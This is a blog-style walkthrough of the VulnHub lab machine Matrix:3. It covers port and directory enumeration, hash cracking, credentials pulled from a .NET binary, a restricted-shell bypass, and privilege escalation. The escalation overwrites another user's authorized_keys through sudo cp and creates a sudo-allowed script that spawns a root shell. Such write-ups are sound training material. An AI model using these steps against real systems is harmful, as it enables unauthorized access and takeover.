---
layout: post
title:  "Matrix:3 Vulnhub Walkthrough"
date:   2020-09-25 15:00:00 +0530
categories: VulnHub CTF
---
Matrix:3 is a machine in which I used a combination of enumeration and reverse engineering to obtain shell access and then exploited the misconfigured sudo permissions to get root Access.

## Scanning
As always, I started scanning with Nmap

```
root@kali:/home/kali# nmap -sC -sV -p- 192.168.198.140
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-25 18:34 EDT
Nmap scan report for 192.168.198.140
Host is up (0.00058s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE VERSION
80/tcp   open  http    SimpleHTTPServer 0.6 (Python 2.7.14)
|_http-title: Welcome in Matrix                                                                                   
6464/tcp open  ssh     OpenSSH 7.7 (protocol 2.0)                                                                 
| ssh-hostkey:                                                                                                    
|   2048 9c:8b:c7:7b:48:db:db:0c:4b:68:69:80:7b:12:4e:49 (RSA)                                                    
|   256 49:6c:23:38:fb:79:cb:e0:b3:fe:b2:f4:32:a2:70:8e (ECDSA)                                                   
|_  256 53:27:6f:04:ed:d1:e7:81:fb:00:98:54:e6:00:84:4a (ED25519)                                                 
7331/tcp open  caldav  Radicale calendar and contacts server (Python BaseHTTPServer)                              
| http-auth:                                                                                                      
| HTTP/1.0 401 Unauthorized\x0D                                                                                   
|_  Basic realm=Login to Matrix                                                                                   
|_http-server-header: SimpleHTTP/0.6 Python/2.7.14                                                                
|_http-title: Site doesn't have a title (text/html).                                                              
MAC Address: 00:0C:29:84:C1:62 (VMware)                                                                           
                                                                                                                  
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                    
Nmap done: 1 IP address (1 host up) scanned in 27.84 seconds  
```
Interesting two http services!
## Web Enumeration
Then I enumerated directories and files using gobuster on the port 80 service and discovered directory called Matrix

```
oot@kali:/home/kali# gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 192.168.198.140 -x py,php,html,txt,json
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://192.168.198.140
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     html,txt,json,py,php
[+] Timeout:        10s
===============================================================
2020/09/25 18:35:44 Starting gobuster
===============================================================
/index.html (Status: 200)
/assets (Status: 301)
/80.py (Status: 200)
/Matrix (Status: 301)
===============================================================
2020/09/25 19:04:22 Finished
===============================================================
```
The directory is made of dicrectories inside directories, so you may go inside each directory or make a script to identify the wanted directory or better BRUTEFORCE. I tried to get the name of main character in the movie "neo" and tried diffrenet combinations as 32 86 and finally what worked is 64. it contained a file called secret.gz

![Username](/assets/machines/vulnhub/matrix3/1.png)

```
kali@kali:~/Downloads$ gzip -d secret.gz 
gzip: secret.gz: not in gzip format
kali@kali:~/Downloads$ fil
filan  file   
kali@kali:~/Downloads$ file secret.gz 
secret.gz: ASCII text
kali@kali:~/Downloads$ strings secret.gz 
admin:76a2173be6393254e72ffa4d6df1030a
kali@kali:~/Downloads$ 

```

tryed to unzip it but failed as it's not a gz file. so i run file command and found out that it's just an ascii text which I followed by strings command to give me this string. It appeared as a username and a hashed password so I cracked the hash and the password truned to be "passwd"

![Username](/assets/machines/vulnhub/matrix3/2.png)

I tried to use those credinatials to connect via ssh but no luck . so I tried to access the http service on the other port and found out that there is a basic authenticaion dialog. I used the credintials found above and voila it worked !

![Username](/assets/machines/vulnhub/matrix3/3.png)

The next step is to enumerate web directories with gobuster but this time I added to other options for the username and password of basic auth.
```
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.198.140:7331 -x py,php,html,txt,json -P passwd -U admin
===============================================================                                                   
Gobuster v3.0.1                                                                                                   
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)                                                   
===============================================================                                                   
[+] Url:            http://192.168.198.140:7331                                                                   
[+] Threads:        10                                                                                            
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt                                  
[+] Status codes:   200,204,301,302,307,401,403                                                                   
[+] User Agent:     gobuster/3.0.1                                                                                
[+] Auth User:      admin                                                                                         
[+] Extensions:     php,html,txt,json,py                                                                          
[+] Timeout:        10s                                                                                           
===============================================================                                         
2020/09/25 18:42:46 Starting gobuster                                                                             
===============================================================
/index.html (Status: 200)
/data (Status: 301)
/assets (Status: 301)
/robots.txt (Status: 200)
/31337.py (Status: 200)
===============================================================
2020/09/25 19:12:28 Finished
===============================================================

## Extracting Data 

```
I tried to access the data directory and downloaded a file called data, after running file command it turned to be a ms windows executable so I tried strings command but no luck, so I used radare2 to get all strings in the program

```
kali@kali:~/Downloads$ file data
data: PE32 executable (GUI) Intel 80386 Mono/.Net assembly, for MS Windows

r2 data
Metadata Signature: 0x6f8 0x10001424a5342 12
.NET Version: v4.0.30319
Number of Metadata Streams: 5
DirectoryAddress: 6c Size: 578
Stream name: MZ� 4
DirectoryAddress: 5e4 Size: 71c
Stream name: MZ� 4
DirectoryAddress: 73676e69 Size: 0
Stream name: MZ� 4
DirectoryAddress: 15c Size: 535523
Stream name: MZ� 4
DirectoryAddress: 10 Size: 49554723
Stream name: MZ� 4
[0x0040389e]> izz
....
134 0x00001480 0x00403280  17  35 (.text) utf16le ./unknowndevice64
135 0x000014a4 0x004032a4  15  32 (.text) utf16le Times New Roman
136 0x000014c4 0x004032c4   6  13 (.text) utf16le label4
137 0x000014d2 0x004032d2  16  34 (.text) utf16le guest:7R1n17yN30
....I
204 0x00002576 0x00404976   5   7 ()  utf8 rѹx.N blocks=Basic Latin,Cyrillic
205 0x0000258d 0x0040498d   4   6 ()  utf8 \a@\t blocks=Basic Latin,Combining Diacritical Marks
206 0x000025c0 0x004049c0  10  11 () ascii "';i6$Jh5c


```
I found a combination of "guest:7R1n17yN30" Immeditatly I used it to login via ssh 
## Escalation to Trinity
When I sshed to the user guest, it gave me a restricted shell so I bypassed the restriction by using this command

```
ssh guest@192.168.198.140 -p 6464 -t bash

```

I ran diffreent Enumeration scripts and found an intersting sudo privilege which allows us to run /bin/cp as a user called trinity

```
guest@porteus:/tmp$ sudo -l
User guest may run the following commands on matrix:
    (root) NOPASSWD: /usr/lib64/xfce4/session/xfsm-shutdown-helper
    (trinity) NOPASSWD: /bin/cp
```

So I thought of generating a ssh key and replacing the existing one on trinity user. so we could access it with the password we generated 
```
guest@matrix:~$ ssh-keygen 
Generating public/private rsa key pair.
Enter file in which to save the key (/home/guest/.ssh/id_rsa): 
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Passphrases do not match.  Try again.
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/guest/.ssh/id_rsa.
Your public key has been saved in /home/guest/.ssh/id_rsa.pub.
The key fingerprint is:
SHA256:yASWkvV4ElQOhY5tWA+7Tf8v3wqaHIHmGgbAMS7ebGg guest@matrix
The key's randomart image is:
+---[RSA 2048]----+
| o +B=o          |
|o =.=B           |                                                                                               
|oo Bo+=          |                                                                                               
|o.* ==oo         |                                                                                               
| E.= +=.S        |                                                                                               
|. ...o. ..       |                                                                                               
|    o . ...      |                                                                                               
|   . o . +o. .   |                                                                                               
|    .   +  ++..  |                                                                                               
+----[SHA256]-----+                                                                                               
guest@matrix:~$ cat /home/guest/.ssh/id_rsa.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCayKe/0XP1mAa5aDRAEC1GDkg8SdQ3iFjxl1tLeeL3nk5MmfW7yH1gzeZDvRKojVnv92cGKwapVq5bFEuXSAm3djXM2F4iuuIFNOux1zsxTJnwaw6wEUiFmy0M3SrK16yY/Ayj7YsgMFCmGEq8PLSmZ+vt3rkgtYWyHPtPvlCrb2jcw9Wc7hcoUZRHjs6UTIOZpFVON4QBlweDMmR0WcYLTAjLIviqDHcW7e1dWU24h5keMxecKk6Xdy03Yw7Je0Q0/Ho9ANcCoH+OJvKi901LoMtIeW3Igvvs5/K0+JANiPjb5PEsukZEI5/xJMpqXJt+N38XqkKP10TbhxC9qZzj guest@matrix                                                               
guest@matrix:~$ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCayKe/0XP1mAa5aDRAEC1GDkg8SdQ3iFjxl1tLeeL3nk5MmfW7yH1gzeZDvRKojVnv92cGKwapVq5bFEuXSAm3djXM2F4iuuIFNOux1zsxTJnwaw6wEUiFmy0M3SrK16yY/Ayj7YsgMFCmGEq8PLSmZ+vt3rkgtYWyHPtPvlCrb2jcw9Wc7hcoUZRHjs6UTIOZpFVON4QBlweDMmR0WcYLTAjLIviqDHcW7e1dWU24h5keMxecKk6Xdy03Yw7Je0Q0/Ho9ANcCoH+OJvKi901LoMtIeW3Igvvs5/K0+JANiPjb5PEsukZEI5/xJMpqXJt+N38XqkKP10TbhxC9qZzj guest@matrix" > authorized_keys  
guest@matrix:~$ sudo -u trinity /bin/cp authorized_keys /home/trinity/.ssh/authorized_keys
guest@matrix:~$ ssh trinity@192.168.198.140 -p 6464 -t bash
The authenticity of host '[192.168.198.140]:6464 ([192.168.198.140]:6464)' can't be established.
ECDSA key fingerprint is SHA256:BMhLOBAe8UBwzvDNexM7vC3gv9ytO1L8etgkkIL8Ipk.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '[192.168.198.140]:6464' (ECDSA) to the list of known hosts.
Enter passphrase for key '/home/guest/.ssh/id_rsa': 
bash-4.4$ id
uid=1001(trinity) gid=1001(trinity) groups=1001(trinity)
```

## Escalation to Root

Running sudo -l again , now we could execute a script called oracle as root. but when I cd to /home/trinity I didnt' find this script . so I created a scirpt with a same name containing the word "/bin/bash"
```
sh-4.4$ sudo -l
User trinity may run the following commands on matrix:
    (root) NOPASSWD: /home/trinity/oracle
sh-4.4$ cd /home/trinity/
sh-4.4$ ls -la
total 72
drwxr-xr-x 14 trinity trinity 4096 Apr  3  2019 .
drwxr-xr-x  7 root    root    4096 Aug  6  2018 ..
-rw-------  1 trinity trinity   52 Aug  6  2018 .Xauthority
-rw-------  1 trinity trinity    6 Apr  3  2019 .bash_history
drwxr-xr-x  5 trinity trinity 4096 Aug  6  2018 .cache
drwxr-xr-x 11 trinity trinity 4096 Aug  6  2018 .config
drwx------  3 trinity trinity 4096 Aug  6  2018 .dbus
-rw-------  1 trinity trinity   16 Aug  6  2018 .esd_auth
-rw-r--r--  1 trinity trinity 3729 Oct 23  2017 .screenrc
drwxr-xr-x  2 trinity trinity 4096 Sep 25 19:41 .ssh
drwx------  4 trinity trinity 4096 Aug  6  2018 .thumbnails
drwxr-xr-x  2 trinity trinity 4096 Aug  6  2018 Desktop
drwxr-xr-x  2 trinity trinity 4096 Aug  6  2018 Documents
drwxr-xr-x  2 trinity trinity 4096 Aug  6  2018 Downloads
drwxr-xr-x  2 trinity trinity 4096 Aug  6  2018 Music
drwxr-xr-x  2 trinity trinity 4096 Aug  6  2018 Pictures
drwxr-xr-x  2 trinity trinity 4096 Aug  6  2018 Public
drwxr-xr-x  2 trinity trinity 4096 Aug  6  2018 Videos
sh-4.4$ vi oracle
sh-4.4$ chmod +x oracle 
sh-4.4$ sudo ./oracle 
sh-4.4# id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
sh-4.4# whoami
root
sh-4.4# cd ~
sh-4.4# cat flag.txt 


             ,----------------,              ,---------,
        ,-----------------------,          ,"        ,"|
      ,"                      ,"|        ,"        ,"  |
     +-----------------------+  |      ,"        ,"    |
     |  .-----------------.  |  |     +---------+      |
     |  |                 |  |  |     | -==----'|      |
     |  |  Matrix is      |  |  |     |         |      |
     |  |  compromised    |  |  |/----|`---=    |      |
     |  |  C:\>_reload    |  |  |   ,/|==== ooo |      ;
     |  |                 |  |  |  // |(((( [33]|    ,"
     |  `-----------------'  |," .;'| |((((     |  ,"
     +-----------------------+  ;;  | |         |,"     -morpheus AKA (unknowndevice64)-
        /_)______________(_/  //'   | +---------+
   ___________________________/___  `,
  /  oooooooooooooooo  .o.  oooo /,   \,"-----------
 / ==ooooooooooooooo==.o.  ooo= //   ,`\--{)B     ,"
/_==__==========__==_ooo__ooo=_/'   /___________,"
`-----------------------------'

-[ 7h!5 !5 n07 7h3 3nd, m47r!x w!11 r37urn ]-


```

and voila here is the root privilege!





